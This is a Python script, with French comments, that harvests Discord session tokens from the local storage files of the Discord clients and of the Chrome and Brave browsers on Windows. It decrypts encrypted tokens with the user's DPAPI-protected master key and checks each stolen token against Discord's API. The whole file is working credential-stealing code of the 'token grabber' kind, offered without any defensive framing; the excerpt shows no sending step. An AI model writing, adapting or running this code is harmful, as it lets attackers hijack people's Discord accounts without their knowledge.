import os
import re
import json
import base64
import requests
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

def decrypt_val(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    return cipher.decrypt(payload)[:-16].decode()

def get_master_key(path):
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def is_valid_token(token):
    url = "https://discord.com/api/v9/users/@me"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    }
    try:
        response = requests.get(url, headers=headers, timeout=10)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def get_discord_tokens():
    tokens = set()
    appdata = os.getenv("localappdata")
    roaming = os.getenv("appdata")
    paths = {
        'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
        'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        # Ajoute d'autres navigateurs si nécessaire
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            full_path = os.path.join(path, file_name)
            if not file_name.endswith(('.log', '.ldb')):
                continue
            try:
                with open(full_path, 'r', errors='ignore') as file:
                    for line in file.readlines():
                        # Token en clair
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line.strip()):
                            if is_valid_token(token):
                                tokens.add(token)
                        # Token chiffré
                        for enc_token in re.findall(r"dQw4w9WgXcQ:[^\"]*", line.strip()):
                            try:
                                master_key = get_master_key(os.path.join(roaming, platform, "Local State"))
                                token = decrypt_val(base64.b64decode(enc_token.split('dQw4w9WgXcQ:')[1]), master_key)
                                if is_valid_token(token):
                                    tokens.add(token)
                            except Exception:
                                continue
            except Exception as e:
                print(f"Erreur lors du traitement du fichier {file_name}: {e}")

    return list(tokens)